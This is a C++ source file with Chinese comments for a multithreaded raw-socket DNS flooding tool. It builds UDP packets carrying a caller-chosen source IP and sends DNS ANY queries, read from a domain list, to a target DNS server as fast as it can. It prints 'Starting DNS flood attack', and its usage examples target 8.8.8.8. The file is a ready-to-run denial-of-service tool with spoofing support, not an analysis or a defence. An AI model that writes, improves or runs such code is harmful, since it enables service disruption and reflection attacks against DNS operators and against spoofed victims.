#include <iostream>
#include <fcntl.h>
#include <unistd.h>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <cstring>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <chrono>
#include <signal.h>

// DNS头部结构
struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

// DNS查询问题部分
struct dns_question {
    uint16_t qtype;
    uint16_t qclass;
};

class HighPerfDNSFlooder {
private:
    int raw_sock;
    std::string source_ip;
    std::string dns_server;
    std::vector<std::string> domains;
    std::atomic<uint64_t> packets_sent;
    std::atomic<bool> running;
    
    // 计算IP校验和
    uint16_t checksum(uint16_t *buf, int len) {
        uint32_t sum = 0;
        while (len > 1) {
            sum += *buf++;
            len -= 2;
        }
        if (len == 1) {
            sum += *(uint8_t*)buf;
        }
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
    // 编码域名（www.google.com -> 3www6google3com0）
    void encode_domain_name(const std::string& domain, std::vector<uint8_t>& buffer) {
        size_t start = 0;
        size_t end = domain.find('.');
        
        while (end != std::string::npos) {
            std::string segment = domain.substr(start, end - start);
            buffer.push_back(segment.length());
            buffer.insert(buffer.end(), segment.begin(), segment.end());
            start = end + 1;
            end = domain.find('.', start);
        }
        
        // 最后一段
        std::string last_segment = domain.substr(start);
        buffer.push_back(last_segment.length());
        buffer.insert(buffer.end(), last_segment.begin(), last_segment.end());
        buffer.push_back(0); // 结束标记
    }
    
    // 构造DNS ANY请求包
    void build_dns_packet(const std::string& domain, std::vector<uint8_t>& packet, uint16_t src_port) {
        packet.clear();
        
        // IP头部
        struct iphdr ip_header;
        ip_header.ihl = 5;
        ip_header.version = 4;
        ip_header.tos = 0;
        ip_header.tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 
                                 sizeof(struct dns_header) + domain.length() + 5 + sizeof(struct dns_question));
        ip_header.id = htons(rand() % 65535);
        ip_header.frag_off = 0;
        ip_header.ttl = 64;
        ip_header.protocol = IPPROTO_UDP;
        inet_pton(AF_INET, source_ip.c_str(), &ip_header.saddr);
        inet_pton(AF_INET, dns_server.c_str(), &ip_header.daddr);
        ip_header.check = 0;
        
        // UDP头部
        struct udphdr udp_header;
        udp_header.source = htons(src_port); // 使用不同的源端口
        udp_header.dest = htons(53);         // DNS端口
        udp_header.len = htons(sizeof(struct udphdr) + sizeof(struct dns_header) + 
                              domain.length() + 5 + sizeof(struct dns_question));
        udp_header.check = 0;
        
        // DNS头部
        struct dns_header dns_hdr;
        dns_hdr.id = htons(rand() % 65535);
        dns_hdr.flags = htons(0x0100); // 标准查询
        dns_hdr.qdcount = htons(1);    // 1个问题
        dns_hdr.ancount = 0;
        dns_hdr.nscount = 0;
        dns_hdr.arcount = 0;
        
        // DNS问题部分
        std::vector<uint8_t> encoded_domain;
        encode_domain_name(domain, encoded_domain);
        
        struct dns_question question;
        question.qtype = htons(255);  // ANY类型
        question.qclass = htons(1);   // IN类
        
        // 组装包
        packet.resize(ntohs(ip_header.tot_len));
        
        // 复制IP头部
        memcpy(packet.data(), &ip_header, sizeof(ip_header));
        
        // 复制UDP头部
        memcpy(packet.data() + sizeof(ip_header), &udp_header, sizeof(udp_header));
        
        // 复制DNS头部
        memcpy(packet.data() + sizeof(ip_header) + sizeof(udp_header), 
               &dns_hdr, sizeof(dns_hdr));
        
        // 复制编码后的域名和问题
        size_t offset = sizeof(ip_header) + sizeof(udp_header) + sizeof(dns_header);
        memcpy(packet.data() + offset, encoded_domain.data(), encoded_domain.size());
        
        offset += encoded_domain.size();
        memcpy(packet.data() + offset, &question, sizeof(question));
        
        // 计算IP校验和
        struct iphdr* final_ip_header = (struct iphdr*)packet.data();
        final_ip_header->check = checksum((uint16_t*)packet.data(), sizeof(ip_header));
    }
    
    // 发送线程
    void send_thread(int thread_id, int thread_count, int total_threads) {
        std::vector<uint8_t> packet;
        struct sockaddr_in dest_addr;
        
        memset(&dest_addr, 0, sizeof(dest_addr));
        dest_addr.sin_family = AF_INET;
        inet_pton(AF_INET, dns_server.c_str(), &dest_addr.sin_addr);
        
        size_t domain_count = domains.size();
        if (domain_count == 0) return;
        
        // 每个线程使用不同的源端口范围，避免冲突
        uint16_t base_port = 10000 + (thread_id * 1000);
        
        std::cout << "Thread " << thread_id << " started, using ports " 
                  << base_port << "-" << (base_port + 999) << std::endl;
        
        int domain_index = 0;
        uint16_t port_index = 0;
        
        while (running) {
            // 轮询域名和端口
            const std::string& domain = domains[domain_index];
            uint16_t src_port = base_port + (port_index % 1000);
            
            build_dns_packet(domain, packet, src_port);
            
            ssize_t sent = sendto(raw_sock, packet.data(), packet.size(), 0,
                                (struct sockaddr*)&dest_addr, sizeof(dest_addr));
            
            if (sent > 0) {
                packets_sent++;
            }
            
            // 更新索引
            domain_index = (domain_index + 1) % domain_count;
            port_index++;
            
            // 轻微的优化，避免过于密集的循环
            if (domain_index % 100 == 0) {
                std::this_thread::yield();
            }
        }
    }

public:
    HighPerfDNSFlooder(const std::string& src_ip, const std::string& dns_srv) 
        : source_ip(src_ip), dns_server(dns_srv), packets_sent(0), running(false) {
        
        // 创建原始套接字
        raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (raw_sock < 0) {
            perror("socket");
            throw std::runtime_error("Failed to create raw socket (need root privileges)");
        }
        
        // 启用IP_HDRINCL，让我们自己构造IP头部
        int one = 1;
        if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
            perror("setsockopt");
            close(raw_sock);
            throw std::runtime_error("Failed to set IP_HDRINCL");
        }
        
        // 设置socket为非阻塞（可选，根据需求）
        int flags = fcntl(raw_sock, F_GETFL, 0);
        fcntl(raw_sock, F_SETFL, flags | O_NONBLOCK);
    }
    
    ~HighPerfDNSFlooder() {
        stop();
        if (raw_sock >= 0) {
            close(raw_sock);
        }
    }
    
    // 从文件加载域名
    bool load_domains(const std::string& filename) {
        std::ifstream file(filename);
        if (!file.is_open()) {
            std::cerr << "Failed to open file: " << filename << std::endl;
            return false;
        }
        
        std::string line;
        while (std::getline(file, line)) {
            if (!line.empty()) {
                domains.push_back(line);
            }
        }
        
        std::cout << "Loaded " << domains.size() << " domains from " << filename << std::endl;
        return !domains.empty();
    }
    
    // 添加单个域名
    void add_domain(const std::string& domain) {
        domains.push_back(domain);
    }
    
    // 开始洪水攻击
    void start(int thread_count = -1) {
        if (domains.empty()) {
            std::cerr << "No domains loaded!" << std::endl;
            return;
        }
        
        // 如果未指定线程数，使用CPU核心数
        if (thread_count <= 0) {
            thread_count = std::thread::hardware_concurrency();
            if (thread_count == 0) thread_count = 4;
        }
        
        running = true;
        packets_sent = 0;
        
        std::vector<std::thread> threads;
        
        std::cout << "==========================================" << std::endl;
        std::cout << "Starting DNS flood attack" << std::endl;
        std::cout << "Source IP: " << source_ip << std::endl;
        std::cout << "DNS Server: " << dns_server << std::endl;
        std::cout << "Domains loaded: " << domains.size() << std::endl;
        std::cout << "Thread count: " << thread_count << std::endl;
        std::cout << "==========================================" << std::endl;
        
        // 启动发送线程
        for (int i = 0; i < thread_count; ++i) {
            threads.emplace_back(&HighPerfDNSFlooder::send_thread, this, i, thread_count, thread_count);
        }
        
        // 统计线程
        std::thread stats_thread([this]() {
            auto last_time = std::chrono::steady_clock::now();
            uint64_t last_count = 0;
            
            while (running) {
                std::this_thread::sleep_for(std::chrono::seconds(2));
                
                auto now = std::chrono::steady_clock::now();
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - last_time).count();
                uint64_t current_count = packets_sent.load();
                uint64_t pps = (current_count - last_count) / (elapsed ? elapsed : 1);
                
                std::cout << "Packets sent: " << current_count 
                         << " | PPS: " << pps 
                         << " | Running threads: " << std::thread::hardware_concurrency() << std::endl;
                
                last_time = now;
                last_count = current_count;
            }
        });
        
        std::cout << "Attack started. Press Ctrl+C to stop..." << std::endl;
        
        // 等待所有线程完成
        for (auto& thread : threads) {
            if (thread.joinable()) {
                thread.join();
            }
        }
        
        stop();
        if (stats_thread.joinable()) {
            stats_thread.join();
        }
        
        std::cout << "Attack stopped. Total packets sent: " << packets_sent << std::endl;
    }
    
    void stop() {
        running = false;
    }
};

// 全局变量用于信号处理
HighPerfDNSFlooder* g_flooder = nullptr;

void signal_handler(int signal) {
    std::cout << "\nReceived signal " << signal << ", stopping..." << std::endl;
    if (g_flooder) {
        g_flooder->stop();
    }
}

void print_usage(const char* program_name) {
    std::cout << "Usage: " << program_name << " <source_ip> <dns_server> <domains_file> [thread_count]" << std::endl;
    std::cout << "Arguments:" << std::endl;
    std::cout << "  source_ip    Source IP address to use in packets" << std::endl;
    std::cout << "  dns_server   Target DNS server IP address" << std::endl;
    std::cout << "  domains_file File containing list of domains (one per line)" << std::endl;
    std::cout << "  thread_count Number of threads to use (optional, default: CPU cores)" << std::endl;
    std::cout << std::endl;
    std::cout << "Examples:" << std::endl;
    std::cout << "  " << program_name << " 192.168.1.100 8.8.8.8 dns.txt" << std::endl;
    std::cout << "  " << program_name << " 192.168.1.100 8.8.8.8 dns.txt 8" << std::endl;
    std::cout << "  " << program_name << " 192.168.1.100 8.8.8.8 dns.txt 16" << std::endl;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc > 5) {
        print_usage(argv[0]);
        return 1;
    }
    
    std::string source_ip = argv[1];
    std::string dns_server = argv[2];
    std::string domains_file = argv[3];
    int thread_count = -1; // 默认使用CPU核心数
    
    if (argc == 5) {
        thread_count = std::stoi(argv[4]);
        if (thread_count <= 0) {
            std::cerr << "Error: Thread count must be positive" << std::endl;
            return 1;
        }
    }
    
    // 注册信号处理
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    try {
        HighPerfDNSFlooder flooder(source_ip, dns_server);
        g_flooder = &flooder;
        
        if (!flooder.load_domains(domains_file)) {
            std::cerr << "Failed to load domains from " << domains_file << std::endl;
            return 1;
        }
        
        std::cout << "Starting with " << (thread_count > 0 ? std::to_string(thread_count) : "auto") 
                  << " threads" << std::endl;
        
        flooder.start(thread_count);
        
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    g_flooder = nullptr;
    return 0;
}
